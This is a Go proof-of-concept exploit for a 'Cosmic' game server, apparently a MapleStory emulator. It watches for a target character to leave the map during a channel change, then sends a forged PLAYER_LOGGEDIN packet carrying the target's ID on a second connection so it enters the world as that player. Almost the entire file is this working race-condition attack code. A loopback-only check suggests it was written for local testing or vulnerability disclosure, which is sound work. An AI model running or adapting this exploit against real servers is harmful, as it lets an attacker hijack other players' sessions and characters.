package main

import (
	"errors"
	"flag"
	"fmt"
	"net"
	"os"
	"strings"
	"time"
)

type options struct {
	host           string
	account        string
	character      string
	target         string
	world          int
	channel        int
	delay          time.Duration
	timeout        time.Duration
	attemptTimeout time.Duration
}

func main() {
	if err := run(); err != nil {
		fmt.Fprintf(os.Stderr, "PoC failed: %v\n", err)
		os.Exit(1)
	}
}

func run() error {
	var options options
	flag.StringVar(&options.host, "host", "127.0.0.1", "loopback address of the Cosmic server")
	flag.StringVar(&options.account, "account", "", "observer account name")
	flag.StringVar(&options.character, "character", "", "observer character name")
	flag.StringVar(&options.target, "target", "", "target character name to observe")
	flag.IntVar(&options.world, "world", 0, "zero-based world ID")
	flag.IntVar(&options.channel, "channel", 1, "one-based channel ID")
	flag.DurationVar(&options.delay, "delay", 75*time.Millisecond, "delay after target removal before the transition attempt")
	flag.DurationVar(&options.timeout, "timeout", 10*time.Second, "network operation timeout")
	flag.DurationVar(&options.attemptTimeout, "attempt-timeout", 3*time.Second, "time to wait for each transition attempt")
	flag.Parse()

	if options.account == "" || options.character == "" || options.target == "" {
		return errors.New("-account, -character, and -target are required")
	}
	if os.Getenv("POC_PASSWORD") == "" {
		return errors.New("POC_PASSWORD is required")
	}
	if options.world < 0 || options.channel < 1 || options.channel > 255 {
		return errors.New("invalid world or channel")
	}
	if err := requireLoopback(options.host); err != nil {
		return err
	}

	observer, err := loginObserver(loginOptions{
		host: options.host, account: options.account, password: os.Getenv("POC_PASSWORD"),
		character: options.character, world: options.world, channel: options.channel, timeout: options.timeout,
	})
	if err != nil {
		return err
	}
	defer observer.conn.Close()
	fmt.Printf("Observer entered world: %s\n", observer.character)

	observerEvents := make(chan packetEvent)
	go streamPackets(observer.conn, observerEvents)

	fmt.Printf("Waiting for %s; place both characters on the same map\n", options.target)
	var target spawnEvent
	for target.ID == 0 {
		event := <-observerEvents
		if event.err != nil {
			return fmt.Errorf("observer disconnected while looking for target: %w", event.err)
		}
		handled, err := handlePing(observer.conn, event.body)
		if err != nil || handled {
			continue
		}
		opcode, err := packetOpcode(event.body)
		if err != nil {
			return err
		}
		if opcode != sendSpawnPlayer {
			continue
		}
		spawn, err := parseSpawnPlayer(event.body)
		if err != nil {
			return err
		}
		if strings.EqualFold(spawn.Name, options.target) {
			target = spawn
		}
	}
	fmt.Printf("Target observed: id=%d name=%s level=%d\n", target.ID, target.Name, target.Level)

	armed, armedEvents, err := armChannel(observer.host, observer.port, options.timeout)
	if err != nil {
		return fmt.Errorf("arm channel connection: %w", err)
	}
	defer func() {
		if armed != nil {
			armed.Close()
		}
	}()
	fmt.Println("Second channel connection armed. Change channels with the game client now.")

	attempting := false
	var attemptTimer *time.Timer
	var timeout <-chan time.Time
	for {
		select {
		case event := <-observerEvents:
			if event.err != nil {
				return fmt.Errorf("observer disconnected: %w", event.err)
			}
			handled, err := handlePing(observer.conn, event.body)
			if err != nil || handled {
				continue
			}
			opcode, err := packetOpcode(event.body)
			if err != nil || opcode != sendRemovePlayer {
				continue
			}
			id, err := parseRemovePlayer(event.body)
			if err != nil {
				return err
			}
			if id != target.ID || attempting {
				continue
			}
			time.Sleep(options.delay)
			packet := packetWithOpcode(recvPlayerLoggedIn)
			packet.i32(target.ID)
			if err := armed.writePacket(packet.bytes); err != nil {
				fmt.Printf("Failed to send transition attempt: %v; re-arming\n", err)
				armed, armedEvents, err = rearmChannel(armed, observer.host, observer.port, options.timeout)
				if err != nil {
					return err
				}
				continue
			}
			fmt.Printf("Observed removal of %d; sent PLAYER_LOGGEDIN after %s\n", target.ID, options.delay)
			attempting = true
			attemptTimer = time.NewTimer(options.attemptTimeout)
			timeout = attemptTimer.C

		case event := <-armedEvents:
			if event.err != nil {
				if !attempting {
					return fmt.Errorf("armed connection failed: %w", event.err)
				}
				fmt.Printf("Attempt ended with disconnect: %v\n", event.err)
				attempting = false
				timeout = nil
				armed, armedEvents, err = rearmChannel(armed, observer.host, observer.port, options.timeout)
				if err != nil {
					return err
				}
				continue
			}
			handled, err := handlePing(armed, event.body)
			if err != nil || handled {
				continue
			}
			opcode, err := packetOpcode(event.body)
			if err != nil {
				return err
			}
			if opcode == sendSetField {
				stats, err := parseSetField(event.body)
				if err != nil {
					return err
				}
				if stats.ID != target.ID {
					return fmt.Errorf("received SET_FIELD for unexpected character %d", stats.ID)
				}
				fmt.Printf("SUCCESS: second connection entered the world as the target.\n%s\n", stats)
				return nil
			}
			if attempting && opcode == 0x0009 {
				r := newPacketReader(event.body)
				r.u16()
				fmt.Printf("Attempt rejected with reason %d; re-arming\n", r.u16())
				attempting = false
				timeout = nil
				armed, armedEvents, err = rearmChannel(armed, observer.host, observer.port, options.timeout)
				if err != nil {
					return err
				}
			}

		case <-timeout:
			fmt.Println("Attempt timed out; re-arming")
			attemptTimer.Stop()
			attempting = false
			timeout = nil
			armed, armedEvents, err = rearmChannel(armed, observer.host, observer.port, options.timeout)
			if err != nil {
				return err
			}
		}
	}
}

func armChannel(host string, port int, timeout time.Duration) (*mapleConn, chan packetEvent, error) {
	conn, err := dialMaple(host, port, timeout)
	if err != nil {
		return nil, nil, err
	}
	events := make(chan packetEvent)
	go streamPackets(conn, events)
	return conn, events, nil
}

func rearmChannel(old *mapleConn, host string, port int, timeout time.Duration) (*mapleConn, chan packetEvent, error) {
	old.Close()
	conn, events, err := armChannel(host, port, timeout)
	if err != nil {
		return nil, nil, fmt.Errorf("re-arm channel connection: %w", err)
	}
	fmt.Println("Fresh channel connection armed; change channels again to retry")
	return conn, events, nil
}

func requireLoopback(host string) error {
	addresses, err := net.LookupIP(host)
	if err != nil {
		return fmt.Errorf("resolve host: %w", err)
	}
	if len(addresses) == 0 {
		return errors.New("host did not resolve to an address")
	}
	for _, address := range addresses {
		if !address.IsLoopback() {
			return errors.New("this demonstration tool only permits loopback server addresses")
		}
	}
	return nil
}
